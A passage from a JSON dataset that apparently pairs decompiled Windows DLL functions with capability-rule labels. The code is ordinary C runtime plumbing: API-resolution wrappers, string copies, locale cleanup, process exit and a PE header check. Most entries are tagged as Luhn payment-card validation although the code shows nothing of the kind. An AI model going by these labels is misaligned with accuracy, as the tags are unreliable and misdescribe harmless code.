        "decompiled_code": "\nulong fcn.1800449d0(void)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    iVar1 = fcn.18004440c(0, \"AreFileApisANSI\", 0x180060f38, 0x180060f3c);\n    if (iVar1 != 0) {\n    // WARNING: Could not recover jumptable at 0x000180044a03. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (**0x18005d3f8)();\n        return uVar2;\n    }\n    return 1;\n}\n",
        "token_count": 139
    },
    "180044f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180044f28(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.18004440c(0xe, \"InitializeCriticalSectionEx\", 0x1800610e8, 0x1800610f0);\n    if (iVar1 == 0) {\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSectionAndSpinCount)(arg1, arg2);\n    }\n    else {\n        (**0x18005d3f8)(arg1, arg2, arg3);\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "18004508": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180045080(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    ulong in_stack_00000028;\n    uint in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    \n    iVar2 = fcn.18004440c(0x10, \"LCMapStringEx\", 0x180061110, \"LCMapStringEx\");\n    if (iVar2 == 0) {\n        uVar1 = fcn.18004516c(arg1, 0);\n        (*_sym.imp.KERNEL32.dll_LCMapStringW)(uVar1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030);\n    }\n    else {\n        (**0x18005d3f8)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                        in_stack_00000040, in_stack_00000048);\n    }\n    return;\n}\n",
        "token_count": 261
    },
    "18004516": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18004516c(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    char *arg2_00;\n    \n    arg2_00 = \"LocaleNameToLCID\";\n    iVar1 = fcn.18004440c(0x12, \"LocaleNameToLCID\", 0x180061148, \"LocaleNameToLCID\");\n    if (iVar1 == 0) {\n        fcn.18004f810(arg1, arg2_00);\n    }\n    else {\n        (**0x18005d3f8)(arg1, arg2);\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "180045c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180045c80(ulong arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.180045cbc();\n    if ((iVar2 != 0) && (iVar1 = (**0x18005d3f8)(arg1),  iVar1 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 89
    },
    "18004b5e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18004b5e0(int64_t arg1)\n\n{\n    if (arg1 != 0) {\n        if (*(arg1 + 0x18) != *0x1800718c8) {\n            fcn.18003fb14(*(arg1 + 0x18));\n        }\n        if (*(arg1 + 0x20) != *0x1800718d0) {\n            fcn.18003fb14(*(arg1 + 0x20));\n        }\n        if (*(arg1 + 0x28) != *0x1800718d8) {\n            fcn.18003fb14(*(arg1 + 0x28));\n        }\n        if (*(arg1 + 0x30) != *0x1800718e0) {\n            fcn.18003fb14(*(arg1 + 0x30));\n        }\n        if (*(arg1 + 0x38) != *0x1800718e8) {\n            fcn.18003fb14(*(arg1 + 0x38));\n        }\n        if (*(arg1 + 0x40) != *0x1800718f0) {\n            fcn.18003fb14(*(arg1 + 0x40));\n        }\n        if (*(arg1 + 0x48) != *0x1800718f8) {\n            fcn.18003fb14(*(arg1 + 0x48));\n        }\n        if (*(arg1 + 0x68) != *0x180071918) {\n            fcn.18003fb14(*(arg1 + 0x68));\n        }\n        if (*(arg1 + 0x70) != *0x180071920) {\n            fcn.18003fb14(*(arg1 + 0x70));\n        }\n        if (*(arg1 + 0x78) != *0x180071928) {\n            fcn.18003fb14(*(arg1 + 0x78));\n        }\n        if (*(arg1 + 0x80) != *0x180071930) {\n            fcn.18003fb14(*(arg1 + 0x80));\n        }\n        if (*(arg1 + 0x88) != *0x180071938) {\n            fcn.18003fb14(*(arg1 + 0x88));\n        }\n        if (*(arg1 + 0x90) != *0x180071940) {\n            fcn.18003fb14(*(arg1 + 0x90));\n        }\n    }\n    return;\n}\n",
        "token_count": 555
    },
    "18004bc5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18004bc54(int64_t *arg1)\n\n{\n    if (arg1 != NULL) {\n        if (*arg1 != *0x1800718b0) {\n            fcn.18003fb14(*arg1);\n        }\n        if (arg1[1] != *0x1800718b8) {\n            fcn.18003fb14(arg1[1]);\n        }\n        if (arg1[2] != *0x1800718c0) {\n            fcn.18003fb14(arg1[2]);\n        }\n        if (arg1[0xb] != *0x180071908) {\n            fcn.18003fb14(arg1[0xb]);\n        }\n        if (arg1[0xc] != *0x180071910) {\n            fcn.18003fb14(arg1[0xc]);\n        }\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "18004c05": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18004c05c(ulong *arg1)\n\n{\n    ulong *puVar1;\n    int64_t in_RDX;\n    \n    puVar1 = arg1 + in_RDX;\n    if (arg1 != puVar1) {\n        do {\n            fcn.18003fb14(*arg1);\n            arg1 = arg1 + 1;\n        } while (arg1 != puVar1);\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "18004ca2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.18004ca24(int16_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int64_t iVar3;\n    int16_t *piVar4;\n    uint uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    \n    if (arg4 == 0) {\n        if (arg1 == NULL) {\n            if (arg2 == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x00018004ca77:\n            if (arg2 != 0) {\n                if (arg4 == 0) {\n                    *arg1 = 0;\n                    return 0;\n                }\n                if (arg3 != 0) {\n                    piVar4 = arg1;\n                    iVar3 = arg4;\n                    iVar7 = arg2;\n                    if (arg4 == -1) {\n                        do {\n                            iVar1 = *((arg3 - arg1) + piVar4);\n                            *piVar4 = iVar1;\n                            piVar4 = piVar4 + 1;\n                            if (iVar1 == 0) {\n                                return 0;\n                            }\n                            iVar7 = iVar7 + -1;\n                        } while (iVar7 != 0);\n                    }\n                    else {\n                        do {\n                            iVar6 = iVar3;\n                            iVar1 = *((arg3 - arg1) + piVar4);\n                            *piVar4 = iVar1;\n                            piVar4 = piVar4 + 1;\n                            if (iVar1 == 0) {\n                                return 0;\n                            }\n                            iVar7 = iVar7 + -1;\n                        } while ((iVar7 != 0) && (iVar3 = iVar6 + -1,  iVar6 + -1 != 0));\n                        iVar3 = iVar6 + -1;\n                        if (iVar7 == 0) {\n                            iVar3 = iVar6;\n                        }\n                        if (iVar3 == 0) {\n                            *piVar4 = 0;\n                        }\n                    }\n                    if (iVar7 != 0) {\n                        return 0;\n                    }\n                    if (arg4 == -1) {\n                        arg1[arg2 + -1] = 0;\n                        return 0x50;\n                    }\n                    *arg1 = 0;\n                    puVar2 = fcn.18003c3e8();\n                    uVar5 = 0x22;\n                    goto code_r0x00018004ca55;\n                }\n                *arg1 = 0;\n            }\n        }\n    }\n    else if (arg1 != NULL) goto code_r0x00018004ca77;\n    puVar2 = fcn.18003c3e8();\n    uVar5 = 0x16;\ncode_r0x00018004ca55:\n    *puVar2 = uVar5;\n    fcn.18003bf58();\n    return uVar5;\n}\n",
        "token_count": 644
    },
    "18004e7d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.18004e7d0(char *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int64_t iVar3;\n    char *pcVar4;\n    uint uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    \n    if (arg4 == 0) {\n        if (arg1 == NULL) {\n            if (arg2 == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x00018004e823:\n            if (arg2 != 0) {\n                if (arg4 == 0) {\n                    *arg1 = '\\0';\n                    return 0;\n                }\n                if (arg3 != 0) {\n                    pcVar4 = arg1;\n                    iVar3 = arg4;\n                    iVar7 = arg2;\n                    if (arg4 == -1) {\n                        do {\n                            cVar1 = pcVar4[arg3 - arg1];\n                            *pcVar4 = cVar1;\n                            pcVar4 = pcVar4 + 1;\n                            if (cVar1 == '\\0') {\n                                return 0;\n                            }\n                            iVar7 = iVar7 + -1;\n                        } while (iVar7 != 0);\n                    }\n                    else {\n                        do {\n                            iVar6 = iVar3;\n                            cVar1 = pcVar4[arg3 - arg1];\n                            *pcVar4 = cVar1;\n                            pcVar4 = pcVar4 + 1;\n                            if (cVar1 == '\\0') {\n                                return 0;\n                            }\n                            iVar7 = iVar7 + -1;\n                        } while ((iVar7 != 0) && (iVar3 = iVar6 + -1,  iVar6 + -1 != 0));\n                        iVar3 = iVar6 + -1;\n                        if (iVar7 == 0) {\n                            iVar3 = iVar6;\n                        }\n                        if (iVar3 == 0) {\n                            *pcVar4 = '\\0';\n                        }\n                    }\n                    if (iVar7 != 0) {\n                        return 0;\n                    }\n                    if (arg4 == -1) {\n                        arg1[arg2 + -1] = '\\0';\n                        return 0x50;\n                    }\n                    *arg1 = '\\0';\n                    puVar2 = fcn.18003c3e8();\n                    uVar5 = 0x22;\n                    goto code_r0x00018004e801;\n                }\n                *arg1 = '\\0';\n            }\n        }\n    }\n    else if (arg1 != NULL) goto code_r0x00018004e823;\n    puVar2 = fcn.18003c3e8();\n    uVar5 = 0x16;\ncode_r0x00018004e801:\n    *puVar2 = uVar5;\n    fcn.18003bf58();\n    return uVar5;\n}\n",
        "token_count": 641
    },
    "18004f81": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.18004f810(int64_t arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    if (arg1 != 0) {\n        iVar4 = 0;\n        iVar5 = 0xe3;\n        do {\n            iVar2 = (iVar5 + iVar4) / 2;\n            iVar3 = fcn.180056cc4(arg1, *(iVar2 * 0x10 + 0x180064150), 0x55);\n            if (iVar3 == 0) {\n                uVar1 = *(iVar2 * 0x10 + 0x180064158);\n                if (uVar1 < 0) {\n                    return 0;\n                }\n                if (0xe3 < uVar1) {\n                    return 0;\n                }\n                return *(uVar1 * 0x10 + 0x1800626f0);\n            }\n            if (iVar3 < 0) {\n                iVar5 = iVar2 + -1;\n            }\n            else {\n                iVar4 = iVar2 + 1;\n            }\n        } while (iVar4 <= iVar5);\n    }\n    return 0;\n}\n",
        "token_count": 282
    },
    "180054c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180054c38(ushort *arg1)\n\n{\n    uint64_t uVar1;\n    ulong in_RDX;\n    ulong in_R8;\n    ulong in_R9;\n    uint32_t auStack24 [4];\n    \n    uVar1 = fcn.180059ee8(auStack24, in_RDX, in_R8, in_R9);\n    if (uVar1 < 5) {\n        if (0xffff < auStack24[0]) {\n            auStack24[0] = 0xfffd;\n        }\n        if (arg1 != NULL) {\n            *arg1 = auStack24[0];\n        }\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "18001661": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.180016614(uint64_t arg1)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    char cVar3;\n    \n    arg1 = arg1 & 0xffffffff;\n    cVar3 = fcn.1800166a8();\n    if (cVar3 != '\\0') {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar2, arg1);\n    }\n    fcn.1800166d8(arg1);\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(arg1);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 159
    },
    "18001677": {
        "rules": [
            "parse PE header"
        ],
        "decompiled_code": "\nvoid fcn.18001677c(ulong arg1)\n\n{\n    code *pcVar1;\n    int16_t *piVar2;\n    int32_t *piVar3;\n    uint auStackX16 [2];\n    int32_t aiStackX24 [2];\n    uchar auStackX32 [8];\n    uchar auStack56 [4];\n    uint uStack52;\n    uint auStack48 [2];\n    ulong uStack40;\n    uint *puStack32;\n    int32_t *piStack24;\n    uchar *puStack16;\n    \n    aiStackX24[0] = 0;\n    auStackX16[0] = 2;\n    uStack40 = 0xfffffffffffffffe;\n    piVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    if ((((piVar2 != NULL) && (*piVar2 == 0x5a4d)) && (piVar3 = *(piVar2 + 0x1e) + piVar2,  *piVar3 == 0x4550)) &&\n       (((*(piVar3 + 6) == 0x20b && (0xe < piVar3[0x21])) && (piVar3[0x3e] != 0)))) {\n        fcn.1800166d8(arg1);\n    }\n    auStackX32[0] = 0;\n    puStack32 = auStackX16;\n    piStack24 = aiStackX24;\n    puStack16 = auStackX32;\n    uStack52 = 2;\n    auStack48[0] = 2;\n    fcn.180016314(auStack56, auStack48, &puStack32, &uStack52);\n    if (aiStackX24[0] == 0) {\n        fcn.180016614(arg1);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 430
    }
}